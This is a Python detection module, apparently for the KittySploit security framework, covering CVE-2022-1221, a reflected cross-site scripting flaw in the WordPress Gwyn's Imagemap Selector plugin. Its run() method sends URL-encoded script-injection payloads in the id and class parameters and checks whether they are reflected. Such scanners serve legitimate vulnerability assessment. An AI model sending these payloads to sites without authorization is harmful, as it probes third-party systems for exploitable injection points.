#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wordpress Gwyn's Imagemap Selector plugin 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': "WordPress Gwyn's Imagemap Selector <=0.3.3 - Cross-Site Scripting Detection",
        'description': "Wordpress Gwyn's Imagemap Selector plugin 0.3.3 and prior contains a reflected cross-site scripting vulnerability. It does not sanitize the id and class parameters before returning them back in attributes.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': [
            'web',
            'scanner',
            'cve',
            'cve2022',
            'wpscan',
            'xss',
            'wordpress',
            'wp-plugin',
            'wp',
            "gwyn\\'s_imagemap_selector_project",
            'vkev',
            'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/641be9f6-2f74-4386-b16e-4b9488f0d2a9',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1221',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1221',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2022-1221',
    }

    def run(self):
        for path in ('/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1&class=%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/wp-content/plugins/gwyns-imagemap-selector/popup.php?id=1%22%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('</script><script>alert(document.domain)</script> popup-',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="WordPress Gwyn's Imagemap Selector <=0.3.3 - Cross-Site Scripting" + " detected",
                    path=path,
                )
                return True
        return False

